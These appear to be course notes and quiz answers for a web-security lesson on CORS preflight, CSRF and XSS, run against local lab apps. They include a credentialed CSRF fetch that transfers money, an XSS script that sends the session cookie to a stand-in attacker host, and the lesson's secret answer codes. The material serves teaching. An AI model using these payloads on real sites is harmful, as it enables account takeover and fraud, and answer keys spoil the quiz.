# Security

## Concept 06 Preflight Request with CORS Quiz 1

- Download L5-Preflight-Requests-Binary Zip
- Run the executable
- Open a browser in incognito mode and go to `localhost:8080`
- Inspect and click on **Send Request** to make a GET request
- Notice that no preflight request has been made, therefore, **Request is not preflighted**

## Concept 07 Preflight Request with CORS Quiz 2

- Download L5-Preflight-Requests-Binary Zip
- Run the executable
- Open a browser in incognito mode and go to `localhost:8080`
- Inspect and click on **Send Request** to make a POST request
- Notice that a preflight request has been made by the **X-Forwarded-For** header

## Concept 08 Preflight Request with CORS Quiz 3

- Download L5-Preflight-Requests-Binary Zip
- Run the executable
- Open a browser in incognito mode and go to `localhost:8080`
- Inspect and click on **Send Request** to make a PUT request
- Notice that a preflight request has been made by the **PUT** method

## Concept 10 CSRF Quiz

- Download L5-CSRF-Binary Zip
- Run the executable
- Open a browser in incognito mode and go to `bank.127.0.0.1.xip.io:8080`
- Sign in using `super secret password`
- Create an html page that executes a CRF request with the following syntax :

`var body = "recipient=Umbrella+Corp&amount=666";
			fetch("http://bank.127.0.0.1.xip.io:8080/transfer", {
				method: "POST",
				headers: {
					'Content-Length': body.length,
					'Content-Type': 'application/x-www-form-urlencoded'
				},
				credentials: 'include',
				body: body
			});
`

- Run the script above and refresh the bank's page
- You should see in the application window the code `setyourcorsheader`

## Concept 12 XSS Quiz

- Download L5-XSS-Binary Zip
- Run the executable
- Open a browser in incognito mode and go to `http://badwebsite.127.0.0.1.xip.io:8080/`
- Use the following code `<script>fetch('http://badwebsite.127.0.0.1.xip.io:8080/?key='+ document.cookie.slice(document.cookie.indexOf('SESSION_ID')).split('=')[1])</script>`
- - You should see in the application window the code `xkcd_327`